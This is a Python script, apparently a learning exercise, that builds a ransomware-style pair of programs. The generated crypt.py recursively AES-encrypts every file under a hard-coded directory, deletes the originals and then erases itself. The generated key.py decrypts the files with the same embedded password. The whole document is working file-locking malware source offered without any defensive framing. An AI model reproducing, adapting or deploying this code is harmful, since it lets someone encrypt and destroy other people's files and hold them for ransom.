direct = input("Write the root directory: ")
password = input("Write the password: ")
print("--------------------------------------")
a = "D:/PythonProjects/PythonLearn/hacking/TEST"
with open("crypt.py", "w", encoding="utf-8") as crypt:
    crypt.write("""
import os, sys
def crypt(file):
    import pyAesCrypt
    print("------------------------------------")
    password = '"""+str(password)+"""'
    buffer_size = 512 * 1024
    pyAesCrypt.encryptFile(str(file), str(file)+".crp", password, buffer_size)
    print(f"[crypted] {str(file)}.crp")
    os.remove(file)

def walk(dir):
    for name in os.listdir(dir): #Пробегает по списку файлов в дериктории
        path = os.path.join(dir, name) #Создает полный путь до текущего файла
        #Пример - D:/PythonProjects/PythonLearn/hacking/TEST/test.py
        if os.path.isfile(path):
            crypt(path)
        else:
            walk(path) #Если файл является дерикторией, то рекурсивно пробегает внутрь
walk('"""+a+"""')
print("------------------------------------")
os.remove(str(sys.argv[0]))""")
    print(f"[+] file crypt.py successfully saved!")
with open("key.py", "w", encoding="utf-8") as key:
    key.write("""
import os, sys
def decrypt(file):
    import pyAesCrypt
    print("------------------------------------")
    password = '"""+str(password)+"""'
    buffer_size = 512 * 1024
    pyAesCrypt.decryptFile(str(file), str(os.path.splitext(file)[0]), password, buffer_size)
    print(f"[decrypted] '{str(os.path.splitext(file)[0])}'")
    os.remove(file)

def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):
            try:
                decrypt(path)
            except Exception as ex:
                pass
        else:
            walk(path)
walk('"""+a+"""')
print("------------------------------------")
os.remove(str(sys.argv[0]))""")
    print(f"[+] file key.py successfully saved!")

